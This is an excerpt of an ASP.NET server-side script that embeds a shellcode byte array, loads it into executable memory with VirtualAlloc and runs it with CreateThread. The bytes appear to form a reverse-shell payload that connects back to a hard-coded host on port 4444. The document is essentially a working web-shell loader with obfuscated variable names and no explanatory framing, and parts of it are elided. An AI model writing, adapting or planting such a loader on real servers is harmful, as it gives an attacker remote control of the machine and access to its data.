...
<script runat="server">
    ...
    {
        byte[] oObzTdIgqQGX = new byte[354] {
...
0x85,0xc9,0x74,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,
...
0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x6a,0x0a,0x68,0x0a,0x0a,0x0e,0x0c,0x68,0x02,0x00,0x11,0x5c,0x89,0xe6,
...
0x00,0x53,0xff,0xd5 };
        ...
        IntPtr d0jHrUPh2hx = VirtualAlloc(IntPtr.Zero,(UIntPtr)oObzTdIgqQGX.Length,MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        System.Runtime.InteropServices.Marshal.Copy(oObzTdIgqQGX,0,d0jHrUPh2hx,oObzTdIgqQGX.Length);
        IntPtr eEf = IntPtr.Zero;
        IntPtr llzx8 = CreateThread(IntPtr.Zero,UIntPtr.Zero,d0jHrUPh2hx,IntPtr.Zero,0,ref eEf);
    }
</script>
